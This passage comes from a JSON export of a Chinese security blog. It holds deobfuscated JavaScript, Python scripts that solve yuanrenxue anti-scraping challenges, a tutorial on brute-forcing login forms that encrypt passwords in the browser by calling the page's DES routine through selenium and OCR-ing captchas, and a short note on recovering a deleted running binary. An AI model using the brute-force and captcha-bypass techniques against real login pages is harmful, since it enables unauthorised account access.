_0x193f00[_0x1badc3 + 0x7], 0x16, -0x2b96aff), _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x8], 0x7, 0x698098d8), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x9], 0xc, -0x74bb0851), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xa], 0x11, -0xa44f), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xb], 0x16, -0x76a32842), _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xc], 0x7, 0x6b901122), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xd], 0xc, -0x2678e6d), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xe], 0x11, -0x5986bc72), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xf], 0x16, 0x49b40821), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x1], 0x5, -0x9e1da9e), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x6], 0x9, -0x3fbf4cc0), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xb], 0xe, 0x265e5a51), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3], 0x14, -0x16493856), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x5], 0x5, -0x29d0efa3), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xa], 0x9, 0x2441453), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xf], 0xe, _0x4e96b4[&#x27;_$tT&#x27;]), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x4], 0x14, _0x4e96b4[&#x27;_$Jy&#x27;]), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x9], 0x5, 0x21e1cde6), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xe], 0x9, -0x3cc8aa0a), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x3], 0xe, -0xb2af279), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x8], 0x14, 0x455a14ed), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xd], 0x5, -0x5caa8e7b), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x2], 0x9, -0x3105c08), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x7], 0xe, 0x676f02d9), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xc], 0x14, -0x72d5b376), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x5], 0x4, -0x241282e), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x8], 0xb, -0x788e097f), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xb], 0x10, 0x6d9d6122), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xe], 0x17, -0x21ac7f4), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x1], 0x4, -0x5b4115bc * b64pad), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x4], 0xb, 0x4bdecfa9), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x7], 0x10, -0x944b4a0), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xa], 0x17, -0x41404390), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xd], 0x4, 0x289b7ec6), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3], 0xb, -0x155ed806), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x3], 0x10, -0x2b10cf7b), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x6], 0x17, 0x2d511fd9), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x9], 0x4, -0x3d12017), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xc], 0xb, -0x1924661b), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xf], 0x10, 0x1fa27cf8), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x2], 0x17, -0x3b53a99b), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3], 0x6, -0xbd6ddbc), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x7], 0xa, 0x432aff97), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xe], 0xf, -0x546bdc59), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x5], 0x15, -0x36c5fc7), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xc], 0x6, 0x655b59c3), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x3], 0xa, -0x70ef89ee), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xa], 0xf, -0x644f153), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x1], 0x15, -0x7a7ba22f), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x8], 0x6, 0x6fa87e4f), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xf], 0xa, -0x1d31920), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x6], 0xf, -0x5cfebcec), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xd], 0x15, 0x4e0811a1), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x4], 0x6, -0x8ac817e), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xb], 0xa, -1120211379), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x2], 0xf, 0x2ad7d2bb), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x9], 0x15, -0x14792c01), _0x3e0c38 = _0x12e4a8(_0x3e0c38, _0x38ca59), _0xdb4d2c = _0x12e4a8(_0xdb4d2c, _0x431764), _0x1724c5 = _0x12e4a8(_0x1724c5, _0x43f1b4), _0x257ec6 = _0x12e4a8(_0x257ec6, _0x5722c0); return [_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6];&#125;function _0x12b47d(_0x149183) &#123; var _0xabbcb3, _0x1145c3 = &#x27;&#x27;, _0x4fce58 = 0x20 * _0x149183[&#x27;length&#x27;]; for (_0xabbcb3 = 0x0; _0xabbcb3 &lt; _0x4fce58; _0xabbcb3 += 0x8) _0x1145c3 += _0x30bc70[&#x27;fromCharCode&#x27;](_0x149183[_0xabbcb3 &gt;&gt; 0x5] &gt;&gt;&gt; _0xabbcb3 % 0x20 &amp; 0xff); return _0x1145c3;&#125;function _0x499969(_0x82fe7e) &#123; var _0x5bdda4, _0x322a73, _0xd0b5cd = &#x27;0123456789abcdef&#x27;, _0x21f411 = &#x27;&#x27;; for (_0x322a73 = 0x0; _0x322a73 &lt; _0x82fe7e[&#x27;length&#x27;]; _0x322a73 += 0x1) _0x5bdda4 = _0x82fe7e[&#x27;charCodeAt&#x27;](_0x322a73), _0x21f411 += _0xd0b5cd[&#x27;charAt&#x27;](_0x5bdda4 &gt;&gt;&gt; 0x4 &amp; 0xf) + _0xd0b5cd[&#x27;charAt&#x27;](0xf &amp; _0x5bdda4); return _0x21f411;&#125;function _0x1ee7ec(_0x206333) &#123; return _0x12b47d(_0x11a7a2(_0x35f5f2(_0x206333), 0x8 * _0x206333[&#x27;length&#x27;]));&#125;function _0x2b8a17(_0x36f847) &#123; return unescape(encodeURIComponent(_0x36f847));&#125;function _0x41873d(_0x5a6962) &#123; return _0x1ee7ec(_0x2b8a17(_0x5a6962));&#125;function _0x37614a(_0x32e7c1) &#123; return _0x499969(_0x41873d(_0x32e7c1));&#125;function _0x474032(_0x233f82, _0xe2ed33, _0x3229f9) &#123; return _0x37614a(_0x233f82);&#125;function _0x12eaf3() &#123; return Date[&#x27;parse&#x27;](new Date());&#125;function _0x2d5f5b() &#123; return new Date()[&#x27;valueOf&#x27;]();&#125;// var _$Wa = _0x12eaf3()for (let i = 1; i &lt; 6; i++) &#123; var _$Wa = _0x12eaf3() if (i == 5) &#123; _$yw = _0x2d5f5b()[&#x27;toString&#x27;](); _0x4e96b4[&#x27;_$is&#x27;] = _$yw; _0x4e96b4[&#x27;_$pr&#x27;][&#x27;push&#x27;](_0x474032(_$yw)); &#125; else &#123; _0x4e96b4[&#x27;_$pr&#x27;][&#x27;push&#x27;](_0x474032(_$Wa)); &#125;&#125;m = _0x474032(_$yw)_0x4e96b4[&#x27;_$qF&#x27;] = CryptoJS[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](_0x4e96b4[&#x27;btoa&#x27;](_0x4e96b4[&#x27;_$is&#x27;])[&#x27;slice&#x27;](0x0, 0x10))// console.log(&#x27;qf&#x27;)// console.log(_0x4e96b4[&#x27;_$qF&#x27;])var _0xc77418 = function (_0x2ddba8, _0x392db0) &#123; return &#x27;_$qF&#x27;;&#125;;_$Ww = _$Tk[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](_0x4e96b4[&#x27;_$pr&#x27;][&#x27;toString&#x27;]());_0x29dd83 = _$Tk[&#x27;AES&#x27;][&#x27;encrypt&#x27;](_$Ww, _0x4e96b4[_0xc77418(&#x27;0x6&#x27;, &#x27;OCbs&#x27;)], &#123; &#x27;mode&#x27;: _$Tk[&#x27;mode&#x27;][&#x27;ECB&#x27;], &#x27;padding&#x27;: _$Tk[&#x27;pad&#x27;][&#x27;Pkcs7&#x27;]&#125;)window._$ss = _0x29dd83[&#x27;toString&#x27;]();RM4hZBv0dDon443M = window._$ssconsole.log(&#x27;m=&#x27;+m)console.log(&#x27;RM4hZBv0dDon443M=&#x27;+RM4hZBv0dDon443M)$_zw=Date.parse(new Date()).toString();urlm= window._$isurlf=$_zwconsole.log(urlf)console.log(urlm)function getC()&#123; return &#123;m,RM4hZBv0dDon443M,urlm,urlf&#125;&#125;","categories":[{"name":"JS对抗","slug":"JS对抗","permalink":"https://f19t.github.io.git/categories/JS%E5%AF%B9%E6%8A%97/"}],"tags":[{"name":"js","slug":"js","permalink":"https://f19t.github.io.git/tags/js/"}]},{"title":"入门级cookie-猿人学第13题","slug":"入门级cookie-猿人学第13题","date":"2023-06-28T12:12:57.000Z","updated":"2023-06-28T12:14:20.971Z","comments":true,"path":"2023/06/28/入门级cookie-猿人学第13题/","link":"","permalink":"https://f19t.github.io.git/2023/06/28/%E5%85%A5%E9%97%A8%E7%BA%A7cookie-%E7%8C%BF%E4%BA%BA%E5%AD%A6%E7%AC%AC13%E9%A2%98/","excerpt":"入门级cookie-猿人学第13题这题考验的是动态cookie的基础知识。我们通过burp抓包可以发现获取数据有两个关键参数page与yuanrenxue_cookie。","text":"入门级cookie-猿人学第13题这题考验的是动态cookie的基础知识。我们通过burp抓包可以发现获取数据有两个关键参数page与yuanrenxue_cookie。 基础知识cookie Cookie可以具有两种类型：会话 Cookie（Session Cookie）和持久 Cookie（Persistent Cookie），它们之间有以下区别： Session Cookie Session Cookie 是临时存储在客户端（浏览器）中的 Cookie，其生命周期限定在用户会话期间。它通常在用户关闭浏览器时被删除，或者在一定时间内没有活动时被浏览器自动删除。Session Cookie 不设置过期时间，而是存储在浏览器的内存中，与用户的会话相关联。 持久 Cookie 持久 Cookie 有一个特定的过期时间，在过期时间之前会一直存在于客户端的 Cookie 存储中。持久 Cookie 存储在客户端的硬盘上，即使用户关闭浏览器，它们仍然会保留，直到达到设置的过期时间。 解题js代码这题考察两个步骤第一步登录获取sessionid，之后再获取yuanrenxue_cookie，然后请求就可以了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import jsonimport reimport requestsimport execjsurl=&quot;https://match.yuanrenxue.cn/match/13&quot;headers = &#123;&quot;user-agent&quot;: &quot;yuanrenxue.project&quot;&#125;s=requests.session()s.headers.update(headers)proxy=&#123;&#x27;https&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125;login=&quot;https://match.yuanrenxue.cn/api/login&quot;data = &#123; &#x27;username&#x27;: &#x27;xxxxx&#x27;, &#x27;password&#x27;: &#x27;xxxxx&#x27;&#125;#登录获取sessionids.post(login,data=data,proxies=proxy,verify=False)#获取yuanrenxue_cookiereq=s.get(url,proxies=proxy,verify=False)pattern = r&quot;=(.*?);&quot;match = re.search(pattern, req.text)jscode= match.group(1)+&#x27;\\&#x27;&#x27;ctx = execjs.compile(&#x27;function exec_js() &#123; return &#x27; + jscode + &#x27;; &#125;&#x27;)result = ctx.call(&#x27;exec_js&#x27;)print(result)cookies = &#123;&#125;key, value = result.strip().split(&#x27;=&#x27;, 1)cookies[key] = values.cookies.update(cookies)num=[]getdaturl=&quot;https://match.yuanrenxue.cn/api/match/13?page=&#123;&#125;&quot;for i in range (1,6): # print(s.get(getdaturl.format(i),proxies=proxy,verify=False).text) data = json.loads(s.get(getdaturl.format(i),proxies=proxy,verify=False).text) values = [item[&#x27;value&#x27;] for item in data[&#x27;data&#x27;]] num=num+valuesaddall=sum(num)print(addall)","categories":[{"name":"JS对抗","slug":"JS对抗","permalink":"https://f19t.github.io.git/categories/JS%E5%AF%B9%E6%8A%97/"}],"tags":[{"name":"js","slug":"js","permalink":"https://f19t.github.io.git/tags/js/"}]},{"title":"入门级JS-猿人学第12题","slug":"入门级JS-猿人学第12题","date":"2023-06-28T12:09:52.000Z","updated":"2023-06-28T12:12:26.870Z","comments":true,"path":"2023/06/28/入门级JS-猿人学第12题/","link":"","permalink":"https://f19t.github.io.git/2023/06/28/%E5%85%A5%E9%97%A8%E7%BA%A7JS-%E7%8C%BF%E4%BA%BA%E5%AD%A6%E7%AC%AC12%E9%A2%98/","excerpt":"入门级JS-猿人学第12题这题是JS入门题，首先我们burp抓包发现获取数据与参数page和m密切相关。","text":"入门级JS-猿人学第12题这题是JS入门题，首先我们burp抓包发现获取数据与参数page和m密切相关。 然后我们去开发者工具看一下这个请求。可以看到请求类型XHR的。所以我们可以设置XHR断点进行调试。 根据堆栈可以很简单的找到加密点。控制台正常输出m值 python代码12345678910111213141516171819import jsonimport requestsimport execjsurl=&quot;https://match.yuanrenxue.cn/api/match/12?page=&#123;i&#125;&amp;m=&#123;m&#125;&quot;headers = &#123;&quot;user-agent&quot;: &quot;yuanrenxue.project&quot;,&quot;Cookie&quot;:&quot;sessionid=xxx;&quot;&#125;exec=&quot;btoa(&#x27;yuanrenxue&#x27; + &#123;i&#125;)&quot;num=[]for i in range (1,6): m=execjs.eval(exec.format(i=i)) req=requests.get(url.format(i=i,m=m),headers=headers) print(req.text) data = json.loads(req.text) values = [item[&#x27;value&#x27;] for item in data[&#x27;data&#x27;]] num=num+valuesaddall=sum(num)print(num)print(addall)","categories":[{"name":"JS对抗","slug":"JS对抗","permalink":"https://f19t.github.io.git/categories/JS%E5%AF%B9%E6%8A%97/"}],"tags":[{"name":"js","slug":"js","permalink":"https://f19t.github.io.git/tags/js/"}]},{"title":"猿人学第一题-JS混淆-源码乱码","slug":"猿人学第一题-JS混淆-源码乱码","date":"2023-06-25T12:49:53.000Z","updated":"2023-06-25T12:56:35.983Z","comments":true,"path":"2023/06/25/猿人学第一题-JS混淆-源码乱码/","link":"","permalink":"https://f19t.github.io.git/2023/06/25/%E7%8C%BF%E4%BA%BA%E5%AD%A6%E7%AC%AC%E4%B8%80%E9%A2%98-JS%E6%B7%B7%E6%B7%86-%E6%BA%90%E7%A0%81%E4%B9%B1%E7%A0%81/","excerpt":"猿人学第一题-JS混淆-源码乱码 我们在爆破用户名密码的时候，用户名经常加密，加密混淆js情况也会存在，发现猿人学这个网站可以很好的学习JS对抗，感谢作者出了这么优秀的题目，我们现在看一下第一道题。","text":"猿人学第一题-JS混淆-源码乱码 我们在爆破用户名密码的时候，用户名经常加密，加密混淆js情况也会存在，发现猿人学这个网站可以很好的学习JS对抗，感谢作者出了这么优秀的题目，我们现在看一下第一道题。 题目地址：https://match.yuanrenxue.cn/match/1 浏览器：chrome Pycharm 2023 做题步骤首先我们拿到题目，发现为抓取数据求平均值。我们使用burp抓个包看一下我们发现他的这个请求数据里面存在机票的价格。接着我们切换到第二页，我们发现多了一个page参数，它用来控制页数。我们还发现m参数的值是不断变化的，那么他应该是某个js动态的去生成的，我们去浏览器里面调试跟踪看看。我们按F12，进入开发者模式，会强制进行的debug。我们将debug取消掉就可以正常的调试了。这里我们有两种方式找到调用堆栈。 在网络里面可以看到调用堆栈。可以点击调用堆栈中的js，去分析源码。 XHR断点xhr：XMLHttpRequest在后台与服务器交换数据，这意味着可以在不加载整个网页的情况下，对网页某部分的内容进行更新。因为请求是xhr类型的，所以我们可以使用XHR断点进行调试。 然后我们重新获取一下网站的数据。我们看到有这几个调用堆栈。逐个去分析代码会发现m的关键生成位置在这个地方。代码被混淆了，对与这种0x的混淆，还是比较好还原的。可以使用下面的网站进行还原 1https://tool.lu/js/index.html 还原后得到关键代码 1234567891011121314(window[&quot;url&quot;] = &quot;/api/&quot; + &quot;match&quot; + &quot;/1&quot;), (request = function () &#123; var _0x2268f9 = Date[&quot;parse&quot;](new Date()) + (16798545 + -72936737 + 156138192), _0x57feae = oo0O0(_0x2268f9[&quot;toStr&quot; + &quot;ing&quot;]()) + window[&quot;f&quot;]; const _0x5d83a3 = &#123;&#125;; (_0x5d83a3[&quot;page&quot;] = window[&quot;page&quot;]), (_0x5d83a3[&quot;m&quot;] = _0x57feae + &quot;丨&quot; + _0x2268f9 / (-1 * 3483 + -9059 + 13542)); var _0xb89747 = _0x5d83a3; 虽然还有混淆，但是已经不妨碍我们读懂逻辑了。m的生成过程为： 1_0x5d83a3[&quot;m&quot;] =_0x57feae + &quot;丨&quot; + _0x2268f9 / (-1 * 3483 + -9059 + 13542); 也就是 1_0x5d83a3[&quot;m&quot;] =(oo0O0((Date[&quot;parse&quot;](new Date()) + (16798545 + -72936737 + 156138192))[&quot;toStr&quot; + &quot;ing&quot;]()) + window[&quot;f&quot;]) + &quot;丨&quot; + (Date[&quot;parse&quot;](new Date()) +(16798545 + -72936737 + 156138192)) / (-1 * 3483 + -9059 + 13542) 在以上关键代码中，我们有些是不认识的，我们使用console.log去查看哪些是局部的哪些是全局的。我们在控制台执行 1(oo0O0((Date[&quot;parse&quot;](new Date()) + (16798545 + -72936737 + 156138192))[&quot;toStr&quot; + &quot;ing&quot;]()) + window[&quot;f&quot;]) + &quot;丨&quot; + (Date[&quot;parse&quot;](new Date()) +(16798545 + -72936737 + 156138192)) / (-1 * 3483 + -9059 + 13542) 发现全是全局的，那么我们就可以直接使用python的selenium去执行了。 完整代码如下 12345678910111213141516171819202122232425262728293031323334353637import jsonimport timeimport urllibimport requestsfrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionschrome_options = Options()chrome_options.add_argument(&quot;--ignore-certificate-errors&quot;)chrome_options.add_argument(&quot;--proxy-server=http://127.0.0.1:8080&quot;)driver = webdriver.Chrome() # 或者 webdriver.Chrome()driver = webdriver.Chrome(options=chrome_options)driver.get(&#x27;https://match.yuanrenxue.cn/match/1&#x27;)price=[]def getdate(i,m): global price # 声明price为全局变量 url=&quot;https://match.yuanrenxue.cn/api/match/1?page=&#123;i&#125;&amp;m=&#123;m&#125;&quot;.format(i=i,m=m) headers = &#123;&quot;user-agent&quot;: &quot;yuanrenxue.project&quot;&#125; req=requests.get(url,headers=headers) print(req.text) data = json.loads(req.text) values = [item[&#x27;value&#x27;] for item in data[&#x27;data&#x27;]] price=price+valuesfor i in range (1,6): exec=&quot;&quot;&quot;var m = (oo0O0((Date[&quot;parse&quot;](new Date()) + (16798545 + -72936737 + 156138192))[&quot;toStr&quot; + &quot;ing&quot;]()) + window[&quot;f&quot;]) + &quot;丨&quot; + (Date[&quot;parse&quot;](new Date()) +(16798545 + -72936737 + 156138192)) / (-1 * 3483 + -9059 + 13542); return m&quot;&quot;&quot; result = driver.execute_script(exec) result= urllib.parse.quote(result) getdate(i,result) time.sleep(2)average = sum(price) / len(price)print(average)driver.quit() tips 调用网站的js去获取变量值，肯定不如直接将关键js抠出来去执行效率高，这个后续去做。 虽然这些训练都是针对爬虫的训练，但是网站安全中的这些js对抗都是差不多。比如用户名密码加密这些操作。","categories":[{"name":"JS对抗","slug":"JS对抗","permalink":"https://f19t.github.io.git/categories/JS%E5%AF%B9%E6%8A%97/"}],"tags":[{"name":"js","slug":"js","permalink":"https://f19t.github.io.git/tags/js/"}]},{"title":"明文JS-密码爆破之前端密码加密","slug":"密码爆破之前端密码加密","date":"2023-06-21T07:22:49.000Z","updated":"2023-06-25T12:53:10.024Z","comments":true,"path":"2023/06/21/密码爆破之前端密码加密/","link":"","permalink":"https://f19t.github.io.git/2023/06/21/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E4%B9%8B%E5%89%8D%E7%AB%AF%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86/","excerpt":"密码爆破之前端密码加密在做漏洞挖掘的时候，我们肯定遇到过，我们想去爆破用户名密码，但是使用Burp抓包发现密码加密了，我们准备的字典无法直接进行使用。本篇文件我们学习一下密码前端加密的情况下我们如何进行爆破。","text":"密码爆破之前端密码加密在做漏洞挖掘的时候，我们肯定遇到过，我们想去爆破用户名密码，但是使用Burp抓包发现密码加密了，我们准备的字典无法直接进行使用。本篇文件我们学习一下密码前端加密的情况下我们如何进行爆破。 准备知识js相关知识变量的相关操作比如我们有这么一段html代码，我们以下面的例子使用js去获取这个变量，设置值、修改值 1&lt;input id=&quot;login_password&quot; autocomplete=&quot;off&quot; name=&quot;login_password&quot; type=&quot;password&quot;&gt; 获取变量1var loginPasswordElement = document.getElementById(&#x27;login_password&#x27;); 这里的login_password 是id。 设置值1loginPasswordElement.value = &#x27;admin&#x27;; 获取值1loginPasswordElement.value; 浏览器调试相关console.logconsole.log()是JavaScript中的一个函数，它被广泛用于打印信息到浏览器的控制台，其中可以打印变量值，函数内容等。比如打印函数内容：我们点击箭头的位置，我们可以将跳转到源代码函数的位置。 调用js生成加密之后的密码这里我们使用chrome浏览器进行前端调试工作。首先比如我们发现一个网站存在登录，我们输入admin&#x2F;123456进行登录，发现burp抓包如下：这种情况就是前端js将密码进行加密之后进行的提交。 前端加密分析最主要的是要搞懂密码在传递的过程当中被哪些函数处理过，也就是我们要搞明白用户名密码提交的运行过程和逻辑。经过分析，这个例子密码的加密为这个关键代码，他做了两个事情 1、加密#login_password 2、将#login_password的值设置为加密之后的 所以我们调用这个关键代码并获取值，可以写成： 12345var us = CryptoJS.enc.Utf8.parse(&#x27;123456&#x27;);var encrypted = CryptoJS.DES.encrypt(us, _SecuritySeed);$(&quot;#login_password&quot;).val(encrypted);var loginPasswordElement = document.getElementById(&#x27;login_password&#x27;);loginPasswordElement.value; 密文我们已经生成了，这里我们发现每次生成的密码是不一样的，因为存在_SecuritySeed这个加密种子，并且每次登录之后，加密种子会更新，但是不用担心，只要我们按照逻辑，正确调用加密，并且正确提交用户名密码和其他参数，是没有问题的。 程序调用我们也可以非常方便的使用selenium去执行js代码并获取返回结果，下面是一个简单例子 1234567891011121314151617181920212223from selenium import webdriverfrom selenium.webdriver.chrome.options import Optionschrome_options = Options()chrome_options.add_argument(&quot;--ignore-certificate-errors&quot;)chrome_options.add_argument(&quot;--proxy-server=http://127.0.0.1:8080&quot;)driver = webdriver.Chrome() # 或者 webdriver.Chrome()driver = webdriver.Chrome(options=chrome_options)driver.get(&#x27;url&#x27;)for i in range (0,10): exec=&quot;&quot;&quot;var us = CryptoJS.enc.Utf8.parse(&#x27;123456&#x27;); var encrypted = CryptoJS.DES.encrypt(us, _SecuritySeed); $(&quot;#login_password&quot;).val(encrypted); var loginPasswordElement = document.getElementById(&#x27;login_password&#x27;); return loginPasswordElement.value;&quot;&quot;&quot; result = driver.execute_script(exec) print(result)driver.quit() 有了加密的密文之后可以自己写request去提交，但是我觉得最有效率的应该是直接调用代码里面的js去提交吧，因为除了用户名密码，还有其他的参数也有可能会提交。 tips如果网站存在图像验证码，我们也可以使用程序进行ocr识别，并进行爆破，这里推荐使用pytesseract库。下面是简单实例 12345def recognize_captcha(): image = Image.open(&#x27;captcha.png&#x27;) captcha = pytesseract.image_to_string(image,config=&quot;--psm 6&quot;) return captcha","categories":[{"name":"JS对抗","slug":"JS对抗","permalink":"https://f19t.github.io.git/categories/JS%E5%AF%B9%E6%8A%97/"}],"tags":[{"name":"js","slug":"js","permalink":"https://f19t.github.io.git/tags/js/"}]},{"title":"Linux运行中文件删除后的恢复","slug":"Linux运行中文件删除后的恢复","date":"2023-06-17T08:09:39.000Z","updated":"2023-06-17T08:20:12.516Z","comments":true,"path":"2023/06/17/Linux运行中文件删除后的恢复/","link":"","permalink":"https://f19t.github.io.git/2023/06/17/Linux%E8%BF%90%E8%A1%8C%E4%B8%AD%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%90%8E%E7%9A%84%E6%81%A2%E5%A4%8D/","excerpt":"Linux运行中文件删除后的恢复在应急响应中，比如攻击者上传了一个挖矿软件A，运行A之后将A删除了，我们如何将这些文件恢复呢，本篇文件我们学习一下。","text":"Linux运行中文件删除后的恢复在应急响应中，比如攻击者上传了一个挖矿软件A，运行A之后将A删除了，我们如何将这些文件恢复呢，本篇文件我们学习一下。 恢复被删除的运行中文件这里我们随便写一个go程序，编译成可执行文件。 然后我们将程序后台运行 1nohup ./1 &gt;/dev/null&amp; 这里我们记录一下1这个文件的MD5然后我们删除1 恢复首先我们先找到运行的pid进程号这里我们发现进程pid为 2275518 然后我们使用 1sudo lsof|grep 2275518|grep deleted 得到了我们被删除文件的具体信息。然后我们移动路径到这个进程下面 1cd /proc/2275518 到这里我们就发现了被删除的文件了 我们尝试恢复一下，也就是复制出来。 1cp exe /home/ubuntu/gotest/recover1 